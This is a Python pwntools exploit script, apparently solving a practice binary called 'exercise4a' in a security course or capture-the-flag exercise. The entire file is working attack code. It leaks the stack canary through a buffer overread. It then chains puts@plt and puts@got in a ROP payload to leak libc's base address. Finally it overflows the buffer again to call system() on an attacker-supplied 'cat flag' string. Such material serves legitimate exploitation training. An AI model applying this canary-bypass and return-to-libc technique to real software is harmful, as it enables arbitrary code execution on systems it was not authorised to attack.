#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './exercise4a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

e = ELF(exe)
libc_e = ELF('/usr/lib32/libc-2.31.so')
ropp = ROP(e)


NAME_ADDR = e.symbols['name']
print(f'Name: {hex(NAME_ADDR)}')

puts_libc_addr_plt = e.plt['puts']
puts_libc_addr_got = e.got['puts']
puts_libc_addr_offset = libc_e.symbols['puts']
system_libc_addr_offset = libc_e.symbols['system']

main_addr = e.symbols['main']

print(f'Puts plt: {hex(puts_libc_addr_plt)}')
print(f'Puts got {hex(puts_libc_addr_got)}')
print(f'Main: {hex(main_addr)}')
print(f'Puts offset: {hex(puts_libc_addr_offset)}')
print(f'System offset: {hex(system_libc_addr_offset)}')

r = start()
# SYSTEM_ADDR = r.libc.symbols['system']
r.sendline(b'cat flag\0')

r.recvuntil(b'Enter the secret password:\n')

BUF_SIZE = 20
leak = cyclic(BUF_SIZE - 1) + b'\x0a'
r.send(leak)

r.recvline_contains(cyclic(8))
canary_raw = r.recvline().split(b' is ')[0]
canary = int.from_bytes(canary_raw, byteorder='little')

print(canary_raw)

r.recvuntil(b'Enter the secret password:\n')

leak_payload = cyclic(BUF_SIZE)
leak_payload += pack(canary, 32)
leak_payload += cyclic(20)
leak_payload += pack(puts_libc_addr_plt, 32)
leak_payload += pack(main_addr, 32)
leak_payload += pack(puts_libc_addr_got, 32)
leak_payload += b'\x0a'

r.send(leak_payload)

r.recvuntil(b'is not the password\n')

MAIN_RESTART_INDICATOR = b'\nHi,'
leaked = r.recvuntil(MAIN_RESTART_INDICATOR)[:-len(MAIN_RESTART_INDICATOR)]
real_puts_got = int.from_bytes(leaked[:4], byteorder='little')
print(f'Real Puts GOT: {hex(real_puts_got)}')

libc_base_addr = real_puts_got - puts_libc_addr_offset

system_addr = libc_base_addr + system_libc_addr_offset

print(f'Real system: {hex(system_addr)}')

r.sendline(b'cat flag\0')

r.recvuntil(b'Enter the secret password:\n')

r.send(leak)

r.recvline_contains(cyclic(8))
canary_raw = r.recvline().split(b' is ')[0]
canary = int.from_bytes(canary_raw, byteorder='little')

print(canary_raw)

r.recvuntil(b'Enter the secret password:\n')

payload = cyclic(BUF_SIZE)
payload += pack(canary, 32)
payload += cyclic(20)
payload += pack(system_addr, 32)
payload += cyclic(4)
payload += pack(NAME_ADDR, 32)
payload += b'\x0a'


r.send(payload)

pause(3)

a = r.recvall()
print(a)

